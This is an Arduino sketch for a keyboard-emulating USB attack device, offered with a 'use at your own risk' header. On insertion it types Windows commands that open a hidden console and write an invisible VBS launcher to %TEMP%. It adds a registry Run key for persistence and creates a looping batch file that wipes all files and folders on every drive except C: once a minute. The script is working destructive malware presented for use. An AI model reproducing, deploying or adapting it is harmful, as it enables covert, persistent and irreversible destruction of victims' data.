/*
	USE AT YOUR OWN RISK!
	NOT EVEN TESTED FOR OBVIOUS REASONS!
	By overwraith
*/

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();

  Keyboard.print(F("cmd /Q /D /T:7F /F:OFF /V:OFF /K"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(750);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print(F("M"));

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  // THE DIRECTORY YOU WANT TO HIDE THE SCRIPT IN
  Keyboard.print(F("cd %TEMP%"));

  typeKey(KEY_RETURN);

  // MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
  // Delete vbs file if already exists
  Keyboard.print(F("erase /Q invis.vbs"));

  typeKey(KEY_RETURN);

  // FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
  Keyboard.print(F("copy con invis.vbs"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press("z");
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // Delete batch file if already exists
  Keyboard.print(F("erase /Q SecurityBullseye.bat"));

  typeKey(KEY_RETURN);

  // Make the batch file
  // SLIGHT THROWBACK TO VIDEO GAME BIOSHOCK I/II
  Keyboard.print(F("copy con SecurityBullseye.bat"));

  typeKey(KEY_RETURN);

  // REGISTRY KEY RESTARTS THE SCRIPT ON REBOOT
  Keyboard.print(F("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d \"wscript.exe %TEMP%\\invis.vbs %TEMP%\\SecurityBullseye.bat\" /f"));

  typeKey(KEY_RETURN);

  Keyboard.print(F(":while1"));

  typeKey(KEY_RETURN);

  // C:\ IS USUALLY THE DRIVE THE OS IS INSTALLED ON, SO OMIT.
  Keyboard.print(F("for %%a in (A B D E F G H I J K L M N O P Q R S T U V W X Y Z) do ("));

  typeKey(KEY_RETURN);

  Keyboard.print(F("IF EXIST %%a:\\ erase /Q /S /F \"%%a:\\*.*\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("IF EXIST %%a:\\ rmdir /Q /S \"%%a:\\*\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F(")"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("timeout /t 60"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("goto :while1"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press("z");
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // RUN THE BATCH FILE
  Keyboard.print(F("wscript.exe invis.vbs SecurityBullseye.bat"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("EXIT"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}